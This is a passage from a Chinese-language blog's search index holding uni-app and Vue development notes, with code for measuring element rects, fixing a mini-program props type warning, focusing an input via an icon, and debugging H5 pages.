&#125;)</span><br><span class="line">      .<span class="title function_">exec</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>utils</strong></p>
<p>&#x2F;&#x2F; utils.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getElemRect</span>(<span class="params">selector, all</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> query = uni</span><br><span class="line">            .<span class="title function_">createSelectorQuery</span>()</span><br><span class="line">            <span class="comment">// #ifndef MP-ALIPAY</span></span><br><span class="line">            .<span class="title function_">in</span>(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="comment">// #endif</span></span><br><span class="line">        query[all ? <span class="string">&#x27;selectAll&#x27;</span> : <span class="string">&#x27;select&#x27;</span>](selector)</span><br><span class="line">            .<span class="title function_">boundingClientRect</span>(<span class="function">(<span class="params">rect</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (all &amp; <span class="title class_">Array</span>.<span class="title function_">isArray</span>(rect) &amp;&amp; rect.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(rect);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!all &amp;&amp; rect) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(rect);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">exec</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F; component.vue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; getElemRect &#125; from &#x27;utils.js&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">        getElemRect</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="页面路由跳转"><a href="#页面路由跳转" class="headerlink" title="页面路由跳转"></a>页面路由跳转</h2><p>使用 uni.navigateTo(OBJECT)时，url 可以是相对路径，也可以是绝对路径，注意文件目录层级关系。</p>
<h2 id="swiper-组件-change-从第-2-个开始执行的"><a href="#swiper-组件-change-从第-2-个开始执行的" class="headerlink" title="swiper 组件@change 从第 2 个开始执行的"></a>swiper 组件@change 从第 2 个开始执行的</h2><p>不推荐在 change 事件中触发业务场景（如轮播卡片曝光事件），会漏掉第一个。</p>
<h2 id="小程序中子组件-props-值来自父组件-computed-定义的值控制台报-warn-场景"><a href="#小程序中子组件-props-值来自父组件-computed-定义的值控制台报-warn-场景" class="headerlink" title="小程序中子组件 props 值来自父组件 computed 定义的值控制台报 warn 场景"></a>小程序中子组件 props 值来自父组件 computed 定义的值控制台报 warn 场景</h2><p>如果父组件 computed 定义的值不具备动态绑定更新特征，而是自变量赋值，子组件 props 引用，小程序控制台可能就会打印警告日志。</p>
<h3 id="具体代码分析"><a href="#具体代码分析" class="headerlink" title="具体代码分析"></a>具体代码分析</h3><p>&#x2F;&#x2F; 父组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;view class=&quot;Demo&quot;&gt;</span><br><span class="line">        &lt;image class=&quot;img&quot; :src=&quot;imgUrl&quot; mode=&quot;scaleToFill&quot; @load=&quot;onLoadImg&quot; @error=&quot;onErrorImg&quot;&gt;&lt;/image&gt;</span><br><span class="line">        &lt;Card :margins=&quot;margins&quot; /&gt;</span><br><span class="line">    &lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Card from &#x27;./Card.vue&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    components: &#123; Card &#125;,</span><br><span class="line">    name: &#x27;Demo&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            imgUrl: &#x27;&#x27;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">        margins() &#123;</span><br><span class="line">            let result = &#123;</span><br><span class="line">                top: 0,</span><br><span class="line">                right: 0,</span><br><span class="line">                bottom: 0,</span><br><span class="line">                left: 0</span><br><span class="line">            &#125;;</span><br><span class="line">            if (this.imgUrl) &#123;</span><br><span class="line">                result.bottom = -50;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        onErrorImg() &#123;</span><br><span class="line">            this.imgUrl = &#x27;https://img.zcool.cn/community/015153563ec9e66ac7259e0fc2d030.jpg@3000w_1l_0o_100sh.jpg&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.img &#123;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 200rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F; 子组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;view class=&quot;Card&quot;&gt;</span><br><span class="line">        &lt;view&gt;&#123;&#123; margins &#125;&#125;&lt;/view&gt;</span><br><span class="line">    &lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Card&#x27;,</span><br><span class="line">    props: &#123;</span><br><span class="line">        margins: &#123;</span><br><span class="line">            type: Object,</span><br><span class="line">            default: () =&gt; (&#123;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>微信小程序控制台日志：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[Component] property <span class="string">&quot;margins&quot;</span> of <span class="string">&quot;pagesA/demo/Card&quot;</span> received type-uncompatible value: expected &lt;Object&gt; but got non-object value. Used null instead.</span><br></pre></td></tr></table></figure>

<p>以下方案可以解决</p>
<p>子组件 props 类型兼容（不推荐，可能会存在类型漏掉的情况）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Card&#x27;,</span><br><span class="line">    props: &#123;</span><br><span class="line">        margins: &#123;</span><br><span class="line">            type: [Object, null],</span><br><span class="line">            default: () =&gt; (&#123;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>父组件 computed 中不具备动态绑定更新特征的值，换成 data</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;view class=&quot;Demo&quot;&gt;</span><br><span class="line">        &lt;image class=&quot;img&quot; :src=&quot;imgUrl&quot; mode=&quot;scaleToFill&quot; @load=&quot;onLoadImg&quot; @error=&quot;onErrorImg&quot;&gt;&lt;/image&gt;</span><br><span class="line">        &lt;Card :margins=&quot;margins&quot; /&gt;</span><br><span class="line">    &lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Card from &#x27;./Card.vue&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    components: &#123; Card &#125;,</span><br><span class="line">    name: &#x27;Demo&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            imgUrl: &#x27;&#x27;,</span><br><span class="line">            margins: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        onErrorImg() &#123;</span><br><span class="line">            this.imgUrl = &#x27;https://img.zcool.cn/community/015153563ec9e66ac7259e0fc2d030.jpg@3000w_1l_0o_100sh.jpg&#x27;;</span><br><span class="line">        &#125;,</span><br><span class="line">        getMargins() &#123;</span><br><span class="line">            let result = &#123;</span><br><span class="line">                top: 0,</span><br><span class="line">                right: 0,</span><br><span class="line">                bottom: 0,</span><br><span class="line">                left: 0</span><br><span class="line">            &#125;;</span><br><span class="line">            if (this.imgUrl) &#123;</span><br><span class="line">                result.bottom = -50;</span><br><span class="line">            &#125;</span><br><span class="line">            this.margins = result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.img &#123;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 200rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="非页面组件直接用页面生命周期钩子函数无效"><a href="#非页面组件直接用页面生命周期钩子函数无效" class="headerlink" title="非页面组件直接用页面生命周期钩子函数无效"></a>非页面组件直接用页面生命周期钩子函数无效</h2><p>非页面组件不具备页面组件的生命周期钩子函数，但是可以同组件通信事件绑定<code>hook:页面生命周期钩子函数名</code>实现</p>
<p>&#x2F;&#x2F; 子组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Card&#x27;,</span><br><span class="line">    mounted() &#123;</span><br><span class="line">        this.$root.$emit(&#x27;hook:onHide&#x27;, () =&gt; &#123;</span><br><span class="line">            // 执行业务场景函数</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>打印 this，控制台 this 日志中，vue2 当前是支持 hook 调用页面生命周期钩子函数的。</p>
<hr>
<h2 id="通过点击-icon-图标使-input-组件聚焦"><a href="#通过点击-icon-图标使-input-组件聚焦" class="headerlink" title="通过点击 icon 图标使 input 组件聚焦"></a>通过点击 icon 图标使 input 组件聚焦</h2><p>点击 icon 图标，让 input 组件聚焦，只需要点击图标时，改变 input 组件框的 focus 属性值。</p>
<p>但是，发现一个问题：这个方法只能触发一次。是因为当点击图标以后，focus 的值已经变成 true 了，所以当我们再次点击图标的时候，就不会出现效果了。</p>
<p>解决办法：获取软键盘的位置，如果软键盘的位置变为 0 ，就让 focus 的值变为 false，成功解决问题。</p>
<p>下面是具体的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;view class=&quot;y-input u-flex&quot;&gt;</span><br><span class="line">        &lt;input class=&quot;input&quot; type=&quot;text&quot; :focus=&quot;focus&quot; @blur=&quot;onInputBlur&quot; /&gt;</span><br><span class="line">        &lt;u-icon name=&quot;edit-pen-fill&quot; color=&quot;#2979ff&quot; size=&quot;60&quot; @click=&quot;onEdit&quot;&gt;&lt;/u-icon&gt;</span><br><span class="line">    &lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;y-input&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            focus: false</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        onEdit() &#123;</span><br><span class="line">            this.focus = true;</span><br><span class="line">            uni.onKeyboardHeightChange((res) =&gt; &#123;</span><br><span class="line">                if (res.height === 0) this.focus = false;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        onInputBlur() &#123;</span><br><span class="line">            this.focus = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.input &#123;</span><br><span class="line">    height: 60rpx;</span><br><span class="line">    border: 4rpx solid #e5e5e5;</span><br><span class="line">    border-radius: 16rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="uniapp-debugger-H5"><a href="#uniapp-debugger-H5" class="headerlink" title="uniapp debugger H5"></a>uniapp debugger H5</h2><p>JavaScript或typescript脚本中单行注入<strong>debugger</strong>关键词。本地运行，如<code>yarn serve</code>。</p>
<p>谷歌浏览器访问控制台打印出的域名，打开调试工具，会触发谷歌自带的debugger调试功能。</p>
<p>如果遇到不能触发debugger调试，需要检查<strong>框架忽略列表项</strong>，取消或自定义一些规则来触发debugger调试。</p>
<p><img data-src="https://cdn.huatree.top/image-20240703224606640.png" alt="image-20240703224606640"></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>uniapp</tag>
      </tags>
  </entry>
</search>
